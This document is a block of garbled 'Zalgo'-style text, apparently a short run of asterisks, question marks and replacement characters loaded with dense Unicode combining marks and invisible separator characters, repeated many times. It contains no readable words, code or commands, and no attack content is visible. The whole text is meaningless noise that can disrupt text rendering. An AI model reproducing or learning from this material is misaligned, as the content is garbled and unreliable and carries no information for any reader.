̜̫̘̬̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̀̈͌́̒͌̅̊̅̈́̍̚͜